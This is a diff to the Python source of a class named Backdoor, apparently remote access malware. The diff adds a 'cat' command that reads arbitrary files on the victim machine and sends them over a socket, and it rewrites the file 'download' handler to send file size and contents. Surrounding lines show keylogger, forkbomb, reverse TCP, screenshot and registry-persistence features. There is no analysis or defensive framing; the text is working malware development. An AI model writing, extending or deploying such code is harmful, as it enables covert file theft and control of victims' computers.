@@ -102,7 +102,7 @@ class Backdoor:
                     sys.exit()
                     
                 try:
-                    not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download","screenshot"]
+                    not_in = ["get_ip","victims_info","remove_all","keylogger_start","forkbomb","reverse_tcp","download","screenshot","cat"]
 
                     # Get machine's IP adress
 
@@ -112,23 +112,35 @@ class Backdoor:
                         self.sock.send(ip_message)
 
 
+                    # cat command 
+
+                    if message_command_descrypt.startswith("cat "):
+                        try:
+                            catfile_name = message_command_descrypt.split(" ")[1]
+                            cat_size = os.path.getsize(catfile_name)
+                            self.sock.send(str(cat_size).encode())
+                            time.sleep(2)
+                            with open(catfile_name,"rb") as cat:
+                                cat_read = cat.read()
+                                self.sock.send(cat_read)
+                                
+                        except Exception as e:
+                            self.sock.send(str(e).encode())
+
+                        
                     # Downloading files
+
                     if message_command_descrypt == "download":
                         self.sock.send("You must specify a file!".encode())
 
                     if message_command_descrypt.startswith("download "):
-                        download_file = message_command_descrypt.split(" ")[1]
-                        file_location = os.getcwd()
-                        file_size = os.path.getsize(f"{file_location}/{download_file}")
-                        # self.sock.send(file_size)
-                        with open(download_file, "rb") as f:
-                            count = 0
-                            while count < file_size:
-                                file_data = f.read(1024)
-                                self.sock.sendall(file_data)
-                                count += len(file_data)
-                                break
-                            self.sock.send("All right here!".encode())
+                        file_name = message_command_descrypt.split(" ")[1]
+                        data_size = os.path.getsize(file_name)
+                        self.sock.send(str(data_size).encode("utf-8"))
+
+                        with open(file_name,"rb") as sc:
+                            screenshot_data = sc.read()
+                            self.sock.send(screenshot_data)
                         print("Transference Done!")
                     
                             
@@ -183,9 +195,7 @@ class Backdoor:
                         with open("screenshot.png","rb") as sc:
                             screenshot_data = sc.read()
                             self.sock.send(screenshot_data)
-                            #data_str = b""
-                                #while data_str < screenshot_data:
-                                    #data_str += 
+                            
 
 
 
@@ -260,8 +270,8 @@ class Backdoor:
                         continue"""
                                    
 
-                if message_command_descrypt == "rm":
-                    self.sock.send("You must specify a file".encode())
+                #if message_command_descrypt == "rm":
+                    #self.sock.send("You must specify a file".encode())
 
 
                 """if message_command_descrypt.startswith("win_startup"):
@@ -286,6 +296,7 @@ class Backdoor:
             
             except ConnectionResetError:
                 print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
+                sys.exit()
 
             #self.sock.close()
     def winreg(self,file, path):
